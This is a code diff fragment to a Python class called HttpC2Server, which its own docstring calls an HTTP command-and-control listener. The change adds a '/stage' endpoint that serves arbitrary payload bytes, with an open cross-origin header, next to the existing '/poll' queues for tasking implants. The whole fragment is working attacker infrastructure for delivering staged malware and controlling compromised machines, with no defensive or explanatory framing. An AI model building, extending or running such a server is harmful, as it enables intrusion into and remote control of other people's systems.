@@ -91,12 +91,14 @@ class HttpC2Server:
     """Lightweight HTTP C2 listener using Python's built-in http.server."""
 
     def __init__(self, host: str = '0.0.0.0', port: int = 443,
-                 use_tls: bool = True, certfile: str = None, keyfile: str = None):
+                 use_tls: bool = True, certfile: str = None, keyfile: str = None,
+                 stage_payload: bytes = None):
         self._host = host
         self._port = port
         self._use_tls = use_tls
         self._certfile = certfile
         self._keyfile = keyfile
+        self._stage_payload = stage_payload
         self._outgoing: deque = deque()
         self._incoming: deque = deque()
         self._lock = threading.Lock()
@@ -110,12 +112,21 @@ class HttpC2Server:
         outgoing = self._outgoing
         incoming = self._incoming
         lock = self._lock
+        stage_payload = self._stage_payload
 
         class Handler(BaseHTTPRequestHandler):
             def log_message(self, format, *args):
                 pass
 
             def do_GET(self):
+                if self.path == '/stage' and stage_payload:
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'application/octet-stream')
+                    self.send_header('Content-Length', str(len(stage_payload)))
+                    self.send_header('Access-Control-Allow-Origin', '*')
+                    self.end_headers()
+                    self.wfile.write(stage_payload)
+                    return
                 if self.path == '/poll':
                     with lock:
                         if outgoing:
